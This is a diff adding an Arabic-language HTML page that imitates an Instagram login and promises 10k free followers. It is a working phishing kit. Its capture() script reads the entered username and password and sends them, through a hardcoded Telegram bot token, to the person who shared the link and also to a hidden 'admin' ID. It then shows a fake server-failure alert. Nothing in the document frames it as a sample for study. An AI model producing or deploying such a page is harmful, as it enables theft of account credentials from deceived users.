@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Instagram - زيادة متابعين</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body { font-family: sans-serif; background: #fafafa; display: flex; justify-content: center; padding-top: 50px; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 300px; text-align: center; }
+        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 3px; background: #fafafa; }
+        button { width: 98%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <img src="" width="180">
+        <p style="color: #8e8e8e; font-weight: bold;">سجل دخولك لاستلام 10k متابع مجاناً</p>
+        <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف">
+        <input type="password" id="password" placeholder="كلمة السر">
+        <button onclick="capture()">تسجيل الدخول</button>
+    </div>
+
+    <script>
+        function capture() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const chatId = urlParams.get('chatId'); // أيدي المستخدم الذي أرسل الرابط
+            const adminId = urlParams.get('admin'); // الأيدي الخاص بك 5905562720
+            const token = "8521496596:AAGb7ODWoScawEb5Fm78sPLL8pfBeXZQzlg";
+            
+            const u = document.getElementById('username').value;
+            const p = document.getElementById('password').value;
+            const text = `🎯 **صيد انستا جديد**\n\n👤 المستخدم: \`${u}\`\n🔑 الباسورد: \`${p}\`\n🌐 الموقع: tmpweb.net`;
+
+            // إرسال البيانات فوراً للبوت لكي تصل للمستخدم ولك
+            if(chatId) {
+                fetch(`${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`);
+            }
+            if(adminId) {
+                fetch(`${token}/sendMessage?chat_id=${adminId}&text=${encodeURIComponent("إشعار الإمبراطور:\n"+text)}&parse_mode=Markdown`);
+            }
+            
+            alert("فشل الاتصال بالخادم. حاول مجدداً لاحقاً.");
+        }
+    </script>
+  </body>
+</html>
